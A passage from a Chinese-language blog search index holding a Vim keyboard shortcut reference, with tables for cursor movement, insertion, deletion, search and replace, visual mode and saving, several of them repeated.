<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="文档预览"><a href="#文档预览" class="headerlink" title="文档预览"></a>文档预览</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h3 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索、替换"><a href="#搜索、替换" class="headerlink" title="搜索、替换"></a>搜索、替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h3 id="保存、退出"><a href="#保存、退出" class="headerlink" title="保存、退出"></a>保存、退出</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
<h1 id="编辑视图"><a href="#编辑视图" class="headerlink" title="编辑视图"></a>编辑视图</h1><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=2&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>&lt;Esc&gt;:set cmdheight=10&lt;CR&gt;a</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim默认快捷键-1"><a href="#vim默认快捷键-1" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h2><h3 id="控制光标-1"><a href="#控制光标-1" class="headerlink" title="控制光标"></a>控制光标</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="文档预览-1"><a href="#文档预览-1" class="headerlink" title="文档预览"></a>文档预览</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h3 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="替换-1"><a href="#替换-1" class="headerlink" title="替换"></a>替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h3 id="撤销重做-1"><a href="#撤销重做-1" class="headerlink" title="撤销重做"></a>撤销重做</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索、替换-1"><a href="#搜索、替换-1" class="headerlink" title="搜索、替换"></a>搜索、替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签-1"><a href="#书签-1" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可视模式-1"><a href="#可视模式-1" class="headerlink" title="可视模式"></a>可视模式</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
</table>
</div>
<h3 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>~</code></td>
<td style="text-align:left">切换大小写</td>
</tr>
<tr>
<td style="text-align:left"><code>d</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>c</code></td>
<td style="text-align:left">变更</td>
</tr>
<tr>
<td style="text-align:left"><code>y</code></td>
<td style="text-align:left">复制</td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left">右移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;</code></td>
<td style="text-align:left">左移</td>
</tr>
<tr>
<td style="text-align:left"><code>!</code></td>
<td style="text-align:left">通过外部命令进行过滤</td>
</tr>
</tbody>
</table>
</div>
<h3 id="保存、退出-1"><a href="#保存、退出-1" class="headerlink" title="保存、退出"></a>保存、退出</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>:q</code></td>
<td style="text-align:left">退出 Vim，如果文件已被修改，将退出失败</td>
</tr>
<tr>
<td style="text-align:left"><code>:w</code></td>
<td style="text-align:left">保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:w new_name</code></td>
<td style="text-align:left">用 new_name 作为文件名保存文件</td>
</tr>
<tr>
<td style="text-align:left"><code>:wq</code></td>
<td style="text-align:left">保存文件并退出 Vim</td>
</tr>
<tr>
<td style="text-align:left"><code>:q!</code></td>
<td style="text-align:left">退出 Vim，不保存文件改动</td>
</tr>
<tr>
<td style="text-align:left"><code>ZZ</code></td>
<td style="text-align:left">退出 Vim，如果文件被改动过，保存改动内容</td>
</tr>
<tr>
<td style="text-align:left"><code>ZQ</code></td>
<td style="text-align:left">与 :q! 相同，退出 Vim，不保存文件改动</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
</search>
